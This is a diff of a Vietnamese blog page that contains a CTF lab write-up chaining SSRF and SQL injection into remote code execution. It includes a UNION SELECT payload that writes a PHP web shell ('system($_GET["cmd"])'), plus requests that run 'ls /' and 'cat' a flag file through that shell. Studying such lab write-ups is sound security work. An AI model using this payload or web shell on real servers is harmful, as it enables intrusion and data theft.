@@ -778,7 +778,7 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu:"></a>Giới thiệu:</h2><p>Bài này gồm 2 lỗi : SQLi và SSRF, là 1 bài exploit chain  </p>
+			<h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu:"></a>Giới thiệu:</h2><p>Bài này gồm 2 lỗi: SQLi và SSRF, là 1 bài exploit chain  </p>
 <p>cấu trúc cây thư mục:</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└── challenge</span><br><span class="line">    ├── Dockerfile</span><br><span class="line">    ├── build_docker.sh</span><br><span class="line">    ├── entrypoint.sh</span><br><span class="line">    ├── flag.txt</span><br><span class="line">    ├── init.sql</span><br><span class="line">    └── src</span><br><span class="line">        ├── communicate.php</span><br><span class="line">        ├── images</span><br><span class="line">        │   └── background.png</span><br><span class="line">        ├── index.php</span><br><span class="line">        ├── js</span><br><span class="line">        │   └── sendForm.js</span><br><span class="line">        ├── login.php</span><br><span class="line">        ├── logout.php</span><br><span class="line">        ├── register.php</span><br><span class="line">        ├── templates</span><br><span class="line">        │   ├── communicate.tpl</span><br><span class="line">        │   ├── index.tpl</span><br><span class="line">        │   ├── login.tpl</span><br><span class="line">        │   └── register.tpl</span><br><span class="line">        └── utils</span><br><span class="line">            ├── database.php</span><br><span class="line">            ├── emoji.php</span><br><span class="line">            └── smarty.php</span><br></pre></td></tr></table></figure></div>
 
@@ -801,15 +801,16 @@ Data[new_name]: admin&#39; UNION SELECT &#39;&lt;?php system($_GET[&quot;cmd&quo
 </code></pre>
 <p>Bước 2: Kích hoạt SQL Injection</p>
 <p>Sau khi đổi tên thành công thông qua SSRF, “bom” SQL Injection đã nằm trong Database&#x2F;Session. Để kích hoạt, ta chỉ cần truy cập trang chủ:<br>GET &#x2F;index.php HTTP&#x2F;1.1</p>
-<p>Lúc này, server thực hiện CALL searchUser(‘payload…’). Dấu nháy đơn (‘) sẽ thoát khỏi câu lệnh gốc, thực hiện lệnh UNION SELECT và ghi file shell.php ra thư mục web.<br>Bước 3: Thực thi mã từ xa (RCE)</p>
-<p>Bây giờ, file shell đã nằm trên server. Ta kiểm tra bằng cách liệt kê thư mục gốc &#x2F; để tìm file flag có tên ngẫu nhiên:<br>GET &#x2F;shell.php?cmd&#x3D;ls &#x2F; HTTP&#x2F;1.1</p>
+<p>Lúc này, server thực hiện CALL searchUser(‘payload…’). Dấu nháy đơn (‘) sẽ thoát khỏi câu lệnh gốc, thực hiện lệnh UNION SELECT và ghi file shell.php ra thư mục web.</p>
+<p>Bước 3: Thực thi mã từ xa (RCE)</p>
+<p>Bây giờ, file shell đã nằm trên server. Ta kiểm tra bằng cách liệt kê thư mục gốc  để tìm file flag có tên ngẫu nhiên:<br>GET &#x2F;shell.php?cmd&#x3D;ls &#x2F; HTTP&#x2F;1.1</p>
 <p>Sau khi tìm thấy file có tên dạng [hex]_flag.txt, ta dùng lệnh cat để đọc nội dung:<br>GET &#x2F;shell.php?cmd&#x3D;cat &#x2F;ab12cd34ef56gh78_flag.txt HTTP&#x2F;1.1</p>
-<h2 id="Tong-ket"><a href="#Tong-ket" class="headerlink" title="Tổng kết"></a>Tổng kết</h2><p>Để bài Lab này thành công, cần phải đi qua 3 cánh cửa:</p>
-<pre><code>Cánh cửa SSRF: Để đóng vai &quot;người nhà&quot; (localhost) và tiếp cận hàm edit.
+<h2 id="Tong-ket"><a href="#Tong-ket" class="headerlink" title="Tổng kết"></a>Tổng kết</h2><p>Để bài Lab này thành công, cần phải đi qua 3 cánh cửa</p>
+<pre><code>SSRF: Để đóng vai người nhà (localhost) và tiếp cận hàm edit
 
-Cánh cửa SQLi: Để &quot;cấy&quot; mã độc vào câu truy vấn của Database.
+SQLi: Để cấy mã độc vào câu truy vấn của Database
 
-Cánh cửa File System: Để Database ghi mã độc đó thành một file có thể truy cập được từ bên ngoài.
+File System: Để Database ghi mã độc đó thành một file có thể truy cập được từ bên ngoài
 </code></pre>
 
 		</div>
